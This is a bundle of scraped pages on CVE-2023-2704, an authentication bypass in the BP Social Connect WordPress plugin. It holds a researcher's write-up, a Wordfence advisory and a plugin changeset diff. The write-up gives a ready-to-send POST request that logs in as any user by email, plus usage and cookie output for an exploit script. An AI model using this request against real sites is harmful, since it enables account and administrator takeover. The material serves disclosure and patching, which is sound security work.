=== Content from lana.codes_7216dfa6_20250114_221615.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### BuddyPress Social Connect by VibeThemes WordPress plugin Authentication Bypass

REPORT ID: 1bd0dfd9-ffec-4d69-bc55-286751300cab

The plugin contains an Auth Bypass vulnerability. To bypass authentication, we only need to know the user’s email address. Depending on whose email address we know, we may even be given an administrator role on the website.

#### Let’s check the plugin

The `bp_social_connect_facebook` class adds the following action hook:

```
add_action( 'wp_ajax_nopriv_bp_social_connect_facebook_login', array( $this, 'bp_social_connect_facebook_login' ) );
```

The `bp_social_connect_facebook_login()` method includes the following request handling:

```
extract( $_POST );
```

This code in PHP extracts the values submitted through the POST method and assigns them to variables.

The function then tries to find the user based on the user ID received from Facebook, and if there is such a user, it logs the user in. It then tries to find the user based on the email received from Facebook. If there is such a user, it logs the user in:

```
if ( email_exists( $email ) ) {
	$user = $this->force_login( $email, false );
```

The function doesn’t have any verification that the data is from Facebook. This means that we can enter any arbitrary value in the request, it is not verified by the function.

This means that if we specify the user’s email in the request, it will immediately log us in as the user without verification.

#### Let’s see how we can exploit this vulnerability

We only need to send a POST request to exploit this vulnerability.

The HTTP request to the <https://lana.solutions/vdb/vibethemes-bp-social-connect/> which is a test WordPress website:

```
POST /vdb/vibethemes-bp-social-connect/ HTTP/1.1
Host: lana.solutions
Content-Type: application/x-www-form-urlencoded

action=bp_social_connect_facebook_login&security=f18e5cb1fa&email=vdb%40lana.codes&id=undefined
```

Note: We find the security value (the nonce), in the head as input hidden html.

#### The exploit script

I created a Python script that returns the WordPress logged\_in and auth cookie:

Source: [vibethemes\_bp\_social\_connect\_plugin\_vdb\_get\_exploit\_cookie.py](https://gist.github.com/lana-codes/ffba902ec825be58faf2dd5257737579)

How to use:

```
python3 vibethemes_bp_social_connect_plugin_vdb_get_exploit_cookie.py --website_url="https://lana.solutions/vdb/vibethemes-bp-social-connect/" --email="[[email protected]](/cdn-cgi/l/email-protection)"
```

We get something like this:

```
Response Cookies:

Name: wordpress_logged_in_9b4a50e46ed1050b69b1a8deb83c1965
Value: test%7C1685390027%7CUOOaA1cHvJdNFpHUjE6sBjfEh61w4nuRxOOETVEtwfQ%7C9e01a5ee073e124d9d6f17a23b840808a1edc00b871d9725c26362a7ef0446cb
Domain: lana.solutions
Path: /vdb/vibethemes-bp-social-connect/
Expires: None
Secure: True
HttpOnly: False

Name: wordpress_sec_9b4a50e46ed1050b69b1a8deb83c1965
Value: test%7C1685390027%7CUOOaA1cHvJdNFpHUjE6sBjfEh61w4nuRxOOETVEtwfQ%7C1424381517663a10919166571494d662f748573406acf325695a5e5f138275b8
Domain: lana.solutions
Path: /vdb/vibethemes-bp-social-connect/wp-admin
Expires: None
Secure: True
HttpOnly: False
```

Then all we have to do is set the cookie using the browser’s Developer Tools on the website, which in our case is <https://lana.solutions/vdb/vibethemes-bp-social-connect/>

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I have set the roles and capabilities, so you can only get low level access to the website.

Website: <https://lana.solutions/vdb/vibethemes-bp-social-connect/>

### References

Source Code
<https://wordpress.org/plugins/bp-social-connect/>

Repository
<https://plugins.svn.wordpress.org/bp-social-connect/>

CVE
[CVE-2023-2704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2704)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2023-05-15

Post Published
2023-05-18

Post Updated
2023-06-12

Affected Version
<= 1.5

### Classification

Type
Authentication Bypass

### Researcher

Name
[István Márton](https://lana.report "Visit István Márton’s website")

Email
[[email protected]](/cdn-cgi/l/email-protection#167f787079567a777877387579727365)

### Tags

authentication bypass
exploit
wordpress plugin

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=🐰&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report © 2024 All Rights Reserved.

Made with 💙 by [Lana Codes](https://lana.codes/)



=== Content from www.wordfence.com_e0fdddf3_20250114_221723.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# BP Social Connect <= 1.5 - Authentication Bypass

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   BP Social Connect <= 1.5 - Authentication Bypass

9.8

**Authentication Bypass Using an Alternate Path or Channel**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2023-2704](https://www.cve.org/CVERecord?id=CVE-2023-2704) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | May 18, 2023 |
| Last Updated | January 22, 2024 |
| Researcher | [István Márton - Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes) |

### Description

The BP Social Connect plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 1.5. This is due to insufficient verification on the user being supplied during a Facebook login through the plugin. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the email.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/bp-social-connect/tags/1.5/includes/social/facebook/class.facebook.php#L138)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/bp-social-connect/tags/1.5/includes/social/facebook/class.facebook.php#L188)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2914042%40bp-social-connect%2Ftrunk&old=1904372%40bp-social-connect%2Ftrunk&sfp_email=&sfph_mail=#file6)
* [lana.codes](https://lana.codes/lanavdb/1bd0dfd9-ffec-4d69-bc55-286751300cab/)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fbp-social-connect%2Fbp-social-connect-15-authentication-bypass&t=BP%20Social%20Connect%20%3C%3D%201.5%20-%20Authentication%20Bypass "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fbp-social-connect%2Fbp-social-connect-15-authentication-bypass&text=BP%20Social%20Connect%20%3C%3D%201.5%20-%20Authentication%20Bypass "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fbp-social-connect%2Fbp-social-connect-15-authentication-bypass "LinkedIn")
Email

## Vulnerability Details for BP Social Connect

#### [BP Social Connect](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bp-social-connect)

| Software Type | Plugin |
| --- | --- |
| Software Slug | bp-social-connect [(view on wordpress.org)](https://wordpress.org/plugins/bp-social-connect) |
| Patched? | Yes |
| Remediation | Update to version 1.6.2, or a newer patched version |
| Affected Version | * <= 1.5 |
| Patched Version | * 1.6.2 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_8ff44a7e_20250114_221721.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%3Fnew%3D2914042%2540bp-social-connect%252Ftrunk%26old%3D1904372%2540bp-social-connect%252Ftrunk)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Reverse Diff](/changeset/1904372/bp-social-connect/trunk?old=2914042&old_path=%2Fbp-social-connect%2Ftrunk)

---

# Changes in [bp-social-connect/trunk](/browser/bp-social-connect/trunk?rev=2914042 "Show entry in browser") [[1904372:2914042]](/log/bp-social-connect/trunk?rev=2914042&stop_rev=1904372 "Show revision log")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Location:
[bp-social-connect/trunk](/browser/bp-social-connect/trunk?rev=2914042)
Files:

4 added
1 deleted
8 edited

* [assets/images](/browser/bp-social-connect/trunk/assets/images?rev=2914042 "Show entry in browser")
  (added)
* [assets/images/fb\_logo.png](/browser/bp-social-connect/trunk/assets/images/fb_logo.png?rev=2914042 "Show entry in browser")
  (added)
* [bp\_social\_connect.php](/browser/bp-social-connect/trunk/bp_social_connect.php?rev=2914042 "Show entry in browser")
  (modified)
  ([1 diff](#file2 "Show differences"))
* [changelog.txt](/browser/bp-social-connect/trunk/changelog.txt?rev=2914042 "Show entry in browser")
  (modified)
  ([1 diff](#file3 "Show differences"))
* [includes/class.init.php](/browser/bp-social-connect/trunk/includes/class.init.php?rev=2914042 "Show entry in browser")
  (modified)
  ([4 diffs](#file4 "Show differences"))
* [includes/class.settings.php](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=2914042 "Show entry in browser")
  (modified)
  ([3 diffs](#file5 "Show differences"))
* [includes/social/facebook/class.facebook.php](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042 "Show entry in browser")
  (modified)
  ([6 diffs](#file6 "Show differences"))
* [includes/social/google/class.google.php](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=2914042 "Show entry in browser")
  (modified)
  ([3 diffs](#file7 "Show differences"))
* [includes/social/google/src/service/apiUtils.php](/browser/bp-social-connect/trunk/includes/social/google/src/service/apiUtils.php?rev=2914042 "Show entry in browser")
  (modified)
  ([1 diff](#file8 "Show differences"))
* [includes/social/twitter](/browser/bp-social-connect/trunk/includes/social/twitter?rev=1409553 "Show what was removed (content at revision 1904372)")
  (deleted)
* [languages](/browser/bp-social-connect/trunk/languages?rev=2914042 "Show entry in browser")
  (added)
* [languages/bp-social-connect.pot](/browser/bp-social-connect/trunk/languages/bp-social-connect.pot?rev=2914042 "Show entry in browser")
  (added)
* [readme.txt](/browser/bp-social-connect/trunk/readme.txt?rev=2914042 "Show entry in browser")
  (modified)
  ([4 diffs](#file12 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [bp-social-connect/trunk/bp\_social\_connect.php](/changeset/2914042/bp-social-connect/trunk/bp_social_connect.php?old=1904372&old_path=bp-social-connect%2Ftrunk%2Fbp_social_connect.php "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/bp_social_connect.php")

  | [r1904372](/browser/bp-social-connect/trunk/bp_social_connect.php?rev=1904372#L2 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/bp_social_connect.php?rev=2914042#L2 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 2 | 2 | /\* |
  | 3 | 3 | Plugin Name: BuddyPress Social Connect |
  | 4 |  | Plugin URI: http~~://www.~~vibethemes.com |
  |  | 4 | Plugin URI: https://vibethemes.com |
  | 5 | 5 | Description: Connect BuddyPress Login and Registration with Social Networks |
  | 6 |  | Version: 1.~~5~~ |
  |  | 6 | Version: 1.6.2 |
  | 7 | 7 | Author: VibeThemes |
  | 8 |  | Author URI: http://www.VibeThemes.com/ |
  |  | 8 | Text Domain: bp-social-connect |
  |  | 9 | Author URI: https://VibeThemes.com/ |
  | 9 | 10 | License : GPLv2 or Later |
  | 10 | 11 | \*/ |
* ## [bp-social-connect/trunk/changelog.txt](/changeset/2914042/bp-social-connect/trunk/changelog.txt?old=1904372&old_path=bp-social-connect%2Ftrunk%2Fchangelog.txt "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/changelog.txt")

  | [r1904372](/browser/bp-social-connect/trunk/changelog.txt?rev=1904372#L1 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/changelog.txt?rev=2914042#L1 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 1 |  | \* 1.5 |
  | 2 |  | \* wp\_login parameter bug fix |
  | 3 |  | \* 1.4.1 |
  | 4 |  | \* facebook login changes admin name |
  | 5 |  | \* version1.4 |
  | 6 |  | \* facebook fixed |
  | 7 |  | \* remove BPsocial connect Twitter |
  | 8 |  | \* make sure the user is not an error |
  | 9 |  | \* twitter login fixes |
  | 10 |  | \* google login fixes |
  | 11 |  | \* facebook login fixes |
  | 12 |  | \* bp social connect styling |
  | 13 |  | \* remove mapping field on click |
  | 14 |  | \* Auth filter added for warnings and redirection |
  | 15 |  | \* v1.3 |
  | 16 |  | \* Google and Facebook username filters |
  | 17 |  | \* Empty first name check |
  | 18 |  | \* version 1.3 |
  | 19 |  | \* Facebook keys fixed |
  | 20 |  | \* Image copy updated |
  | 21 |  | \* version1.2.2 |
  | 22 |  | \* Writable Check on Directory for avatars |
  | 23 |  | \* FB Fix |
  | 24 |  | \* version1.2.1 |
  | 25 |  | \* Remember hook removed from Set auth cookie |
  | 26 |  | \* version update |
  | 27 |  | \* Update readme |
  | 28 |  | \* Copy link fixes to move images |
  | 29 |  | \* FB Keys and Fixes |
  | 30 |  | \* Google button filter |
  | 31 |  | \* version1.1 |
  | 32 |  | \* version1.1 |
  | 33 |  | \* Hook on Registration page |
  | 34 |  | \* remove svn connect |
  | 35 |  | \* svn connect |
  | 36 |  | \* Bug fixes in Google social connect |
  | 37 |  | \* Twitter fixes |
  | 38 |  | \* Translation prefix correction. |
  | 39 |  | \* Abraham code |
  | 40 |  | \* Twitter Bug Fix |
  | 41 |  | \* Init 1.0 |
  | 42 |  | \* Initial commit |
  | 43 |  | \* License |
  | 44 |  | \* Read me |
  | 45 |  | \* Trying to Fix twitter repeat logins |
  | 46 |  | \* Plugin init 1.0 |
  | 47 |  | \* Bug fixes |
  | 48 |  | \* CSS for social buttons |
  | 49 |  | \* Added text area css |
  | 50 |  | \* Twitter Map fields |
  | 51 |  | \* Update user display name |
  | 52 |  | \* Generate username and Force login via username functions |
  | 53 |  | \* Twitter Login |
  | 54 |  | \* Important functions |
  | 55 |  | \* CSS for social login |
  | 56 |  | \* Login settings |
  | 57 |  | \* Google auth init |
  | 58 |  | \* Facebook Login init |
  | 59 |  | \* Admin Js changes |
  | 60 |  | \* Style for BP Fields |
  | 61 |  | \* Facebook Login integration |
  | 62 |  | \* Init |
  |  | 1 | \*1.6.2 |
  |  | 2 | \*Security vulnerability patch |
  |  | 3 | \*1.6.1 |
  |  | 4 | \*Security vulnerability fix |
  |  | 5 | \*1.6 |
  |  | 6 | \*fb logo |
  |  | 7 | \*1.5 |
  |  | 8 | \*wp\_login bug fix |
  |  | 9 | \*1.4.2 |
  |  | 10 | \*1.4.1 |
  |  | 11 | \*facebook login changes admin name |
  |  | 12 | \*version1.4 |
  |  | 13 | \*facebook fixed |
  |  | 14 | \*remove BPsocial connect Twitter |
  |  | 15 | \*make sure the user is not an error |
  |  | 16 | \*twitter login fixes |
  |  | 17 | \*google login fixes |
  |  | 18 | \*facebook login fixes |
  |  | 19 | \*bp social connect styling |
  |  | 20 | \*remove mapping field on click |
  |  | 21 | \*Auth filter added for warnings and redirection |
  |  | 22 | \*v1.3 |
  |  | 23 | \*Google and Facebook username filters |
  |  | 24 | \*Empty first name check |
  |  | 25 | \*version 1.3 |
  |  | 26 | \*Facebook keys fixed |
  |  | 27 | \*Image copy updated |
  |  | 28 | \*version1.2.2 |
  |  | 29 | \*Writable Check on Directory for avatars |
  |  | 30 | \*FB Fix |
  |  | 31 | \*version1.2.1 |
  |  | 32 | \*Remember hook removed from Set auth cookie |
  |  | 33 | \*version update |
  |  | 34 | \*Update readme |
  |  | 35 | \*Copy link fixes to move images |
  |  | 36 | \*FB Keys and Fixes |
  |  | 37 | \*Google button filter |
  |  | 38 | \*version1.1 |
  |  | 39 | \*Hook on Registration page |
  |  | 40 | \*remove svn connect |
  |  | 41 | \*svn connect |
  |  | 42 | \*Bug fixes in Google social connect |
  |  | 43 | \*Twitter fixes |
  |  | 44 | \*Translation prefix correction. |
  |  | 45 | \*Twitter Bug Fix |
  |  | 46 | \*Init 1.0 |
  |  | 47 | \*License |
  |  | 48 | \*Read me |
  |  | 49 | \*Trying to Fix twitter repeat logins |
  |  | 50 | \*Plugin init 1.0 |
  |  | 51 | \*Bug fixes |
  |  | 52 | \*CSS for social buttons |
  |  | 53 | \*Added text area css |
  |  | 54 | \*Twitter Map fields |
  |  | 55 | \*Update user display name |
  |  | 56 | \*Generate username and Force login via username functions |
  |  | 57 | \*Twitter Login |
  |  | 58 | \*Important functions |
  |  | 59 | \*CSS for social login |
  |  | 60 | \*Login settings |
  |  | 61 | \*Google auth init |
  |  | 62 | \*Facebook Login init |
  |  | 63 | \*Admin Js changes |
  |  | 64 | \*Style for BP Fields |
  |  | 65 | \*Facebook Login integration |
  |  | 66 | \*Init |
* ## [bp-social-connect/trunk/includes/class.init.php](/changeset/2914042/bp-social-connect/trunk/includes/class.init.php?old=1409577&old_path=bp-social-connect%2Ftrunk%2Fincludes%2Fclass.init.php "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/includes/class.init.php")

  | [r1904372](/browser/bp-social-connect/trunk/includes/class.init.php?rev=1409577#L9 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/includes/class.init.php?rev=2914042#L9 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 9 | 9 |  |
  | 10 | 10 | public function \_\_construct(){ |
  | 11 |  | ~~$this->settings = $this->get();~~ |
  |  | 11 |  |
  | 12 | 12 | new bp\_social\_connect\_facebook; |
  | 13 | 13 | //new bp\_social\_connect\_twitter; |
  | […](/browser/bp-social-connect/trunk/includes/class.init.php?rev=1409577#L35) | […](/browser/bp-social-connect/trunk/includes/class.init.php?rev=2914042#L35) |  |
  | 35 | 35 |  |
  | 36 | 36 | function styling(){ |
  | 37 |  | echo '<style>.bp\_social\_connect { ~~display: inline-block; width: 100%;~~ } |
  |  | 37 | echo '<style>.bp\_social\_connect {     display: flex;flex-direction: column;gap:1rem;align-items: center;} |
  | 38 | 38 | .bp\_social\_connect\_facebook{background:#3b5998;}.bp\_social\_connect\_google{background:#DD4B39 !important;}.bp\_social\_connect > a{text-align:center;float:left;padding:15px;border-radius:2px;color:#fff !important;width:200px;margin:0 5px;}.bp\_social\_connect > a:first-child{margin-left:0;} |
  | 39 | 39 | .bp\_social\_connect > a:before{float:left;font-size:16px;font-family:fontawesome;opacity:0.6;}.bp\_social\_connect\_facebook:before{content:"\f09a";}.bp\_social\_connect\_google:before{content:"\f0d5";}</style>'; |
  | […](/browser/bp-social-connect/trunk/includes/class.init.php?rev=1409577#L41) | […](/browser/bp-social-connect/trunk/includes/class.init.php?rev=2914042#L41) |  |
  | 41 | 41 | function verify\_email(){ |
  | 42 | 42 | if (!is\_user\_logged\_in()) return; |
  |  | 43 |  |
  | 43 | 44 | global $current\_user; |
  | 44 | 45 | get\_currentuserinfo(); |
  | […](/browser/bp-social-connect/trunk/includes/class.init.php?rev=1409577#L48) | […](/browser/bp-social-connect/trunk/includes/class.init.php?rev=2914042#L49) |  |
  | 48 | 49 | } |
  | 49 | 50 | function ajaxurl() { |
  |  | 51 | if(empty($this->settings)){ |
  |  | 52 | $this->settings = get\_option('bp\_social\_connect'); |
  |  | 53 | } |
  |  | 54 |  |
  |  | 55 |  |
  |  | 56 |  |
  | 50 | 57 | wp\_nonce\_field($this->settings['security'],$this->security\_key); |
  | 51 | 58 | ?> |
* ## [bp-social-connect/trunk/includes/class.settings.php](/changeset/2914042/bp-social-connect/trunk/includes/class.settings.php?old=1409553&old_path=bp-social-connect%2Ftrunk%2Fincludes%2Fclass.settings.php "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/includes/class.settings.php")

  | [r1904372](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=1409553#L13 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=2914042#L13 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 13 | 13 | $this->settings=$this->get(); |
  | 14 | 14 | } |
  | 15 |  |  |
  |  | 15 | function get\_settings(){ |
  |  | 16 | if(empty($this->settings)){ |
  |  | 17 | $this->settings = $this->get(); |
  |  | 18 | } |
  |  | 19 | } |
  | 16 | 20 | function enqueue\_admin\_scripts($hook){ |
  | 17 | 21 | if ( 'settings\_page\_bp-social-connect' != $hook ) { |
  | […](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=1409553#L214) | […](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=2914042#L218) |  |
  | 214 | 218 | case 'bp\_fields': |
  | 215 | 219 | echo '<th scope="row" class="titledesc">'.$setting['label'].'</th>'; |
  | 216 |  | echo '<td class="forminp"><a class="add\_new\_map button">'.\_\_('Add BuddyPress profile field map','bp-social-connect').'</a>'; |
  | 217 |  |  |
  | 218 |  | global $bp,$wpdb;; |
  | 219 |  | $table =  $bp->profile->table\_name\_fields; |
  | 220 |  | $bp\_fields = $wpdb->get\_results("SELECT DISTINCT name FROM {$table}"); |
  | 221 |  |  |
  | 222 |  | echo '<ul class="bp\_fields">'; |
  | 223 |  | if(is\_array($this->settings[$setting['name']]['field']) && count($this->settings[$setting['name']]['field'])){ |
  | 224 |  | foreach($this->settings[$setting['name']]['field'] as $key => $field){ |
  | 225 |  | echo '<li><label><select name="'.$setting['name'].'[field][]">'; |
  | 226 |  | foreach($setting['fields'] as $k=>$v){ |
  | 227 |  | echo '<option value="'.$k.'" '.(($field == $k)?'selected=selected':'').'>'.$k.'</option>'; |
  |  | 220 | echo '<td class="forminp">'; |
  |  | 221 | if(function\_exists('bp\_is\_active') && bp\_is\_active('xprofile')){ |
  |  | 222 | $this->get\_settings(); |
  |  | 223 | echo '<a class="add\_new\_map button">'.\_\_('Add BuddyPress profile field map','bp-social-connect').'</a>'; |
  |  | 224 |  |
  |  | 225 | global $bp,$wpdb;; |
  |  | 226 | $table =  $bp->profile->table\_name\_fields; |
  |  | 227 | $bp\_fields = $wpdb->get\_results("SELECT DISTINCT name FROM {$table}"); |
  |  | 228 |  |
  |  | 229 | echo '<ul class="bp\_fields">'; |
  |  | 230 | if(!empty($this->settings[$setting['name']]) && is\_array($this->settings[$setting['name']]['field']) && count($this->settings[$setting['name']]['field'])){ |
  |  | 231 | foreach($this->settings[$setting['name']]['field'] as $key => $field){ |
  |  | 232 | echo '<li><label><select name="'.$setting['name'].'[field][]">'; |
  |  | 233 | foreach($setting['fields'] as $k=>$v){ |
  |  | 234 | echo '<option value="'.$k.'" '.(($field == $k)?'selected=selected':'').'>'.$k.'</option>'; |
  |  | 235 | } |
  |  | 236 | echo '</select></label><select name="'.$setting['name'].'[bpfield][]">'; |
  |  | 237 | foreach($bp\_fields as $f){ |
  |  | 238 | echo '<option value="'.$f->name.'" '.(($this->settings[$setting['name']]['bpfield'][$key] == $f->name)?'selected=selected':'').'>'.$f->name.'</option>'; |
  |  | 239 | } |
  |  | 240 | echo '</select><span class="dashicons dashicons-no remove\_field\_map"></span></li>'; |
  | 228 | 241 | } |
  | 229 |  | ~~echo '</select></label><select name="'.$setting['name'].'[bpfield][]">';~~ |
  | 230 |  | ~~foreach($bp\_fields as $f){~~ |
  | 231 |  | ~~echo '<option value="'.$f->name.'" '.(($this->settings[$setting['name']]['bpfield'][$key] == $f->name)?'selected=selected':'').'>'.$f->name.'</option>';~~ |
  | 232 |  | ~~}~~ |
  | 233 |  | ~~echo '</select><span class="dashicons dashicons-no remove\_field\_map"></span></li>';~~ |
  | 234 | 242 | } |
  |  | 243 | echo '<li class="hide">'; |
  |  | 244 | echo '<label><select rel-name="'.$setting['name'].'[field][]">'; |
  |  | 245 | foreach($setting['fields'] as $k=>$v){ |
  |  | 246 | echo '<option value="'.$k.'">'.$k.'</option>'; |
  |  | 247 | } |
  |  | 248 | echo '</select></label>'; |
  |  | 249 | echo '<select rel-name="'.$setting['name'].'[bpfield][]">'; |
  |  | 250 |  |
  |  | 251 | foreach($bp\_fields as $f){ |
  |  | 252 | echo '<option value="'.$f->name.'">'.$f->name.'</option>'; |
  |  | 253 | } |
  |  | 254 | echo '</select>'; |
  |  | 255 | echo '<span class="dashicons dashicons-no remove\_field\_map"></span></li>'; |
  |  | 256 | echo '</ul></td>'; |
  |  | 257 | }else{ |
  |  | 258 | echo '<div class="notice inline notice-warning notice-alt"><p>'. |
  |  | 259 | \_x('BuddyPress & xProfile fields not active. Fields & profile image can not be mapped','missing buddypress message','bp-social-connect').'</p></div>'; |
  | 235 | 260 | } |
  | 236 |  | ~~echo '<li class="hide">';~~ |
  | 237 |  | ~~echo '<label><select rel-name="'.$setting['name'].'[field][]">';~~ |
  | 238 |  | ~~foreach($setting['fields'] as $k=>$v){~~ |
  | 239 |  | ~~echo '<option value="'.$k.'">'.$k.'</option>';~~ |
  | 240 |  | ~~}~~ |
  | 241 |  | ~~echo '</select></label>';~~ |
  | 242 |  | ~~echo '<select rel-name="'.$setting['name'].'[bpfield][]">';~~ |
  | 243 |  |  |
  | 244 |  | ~~foreach($bp\_fields as $f){~~ |
  | 245 |  | ~~echo '<option value="'.$f->name.'">'.$f->name.'</option>';~~ |
  | 246 |  | ~~}~~ |
  | 247 |  | ~~echo '</select>';~~ |
  | 248 |  | ~~echo '<span class="dashicons dashicons-no remove\_field\_map"></span></li>';~~ |
  | 249 |  | ~~echo '</ul></td>';~~ |
  | 250 | 261 | break; |
  | 251 | 262 | default: |
